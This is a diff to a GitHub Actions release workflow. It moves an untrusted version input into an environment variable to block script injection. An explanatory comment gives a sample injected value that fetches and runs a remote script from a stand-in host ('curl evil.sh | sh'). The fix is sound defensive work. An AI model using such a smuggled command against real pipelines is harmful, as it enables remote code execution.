@@ -51,10 +51,20 @@ jobs:
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
       - id: check
+        env:
+          # Untrusted workflow_dispatch input — must go through an
+          # intermediate environment variable, not be interpolated directly
+          # into the run: script, per GitHub's script-injection guidance
+          # (https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable).
+          # A malicious version value like `0.1.0"; curl evil.sh | sh; #`
+          # would otherwise be spliced into the generated shell script
+          # before bash ever parses it — the "$INPUT_VERSION" quoting below
+          # does NOT protect against this, since the substitution happens
+          # at the YAML-templating stage, not inside the shell.
+          INPUT_VERSION: ${{ inputs.version }}
         run: |
           set -euo pipefail
           PKG_VERSION=$(node -p "require('./packages/aws-durable-execution-sdk-js-insight-vscode/package.json').version")
-          INPUT_VERSION="${{ inputs.version }}"
           if [[ "$INPUT_VERSION" != "$PKG_VERSION" ]]; then
             echo "Input version '$INPUT_VERSION' does not match package.json version '$PKG_VERSION' on this ref. Aborting before creating any release."
             exit 1
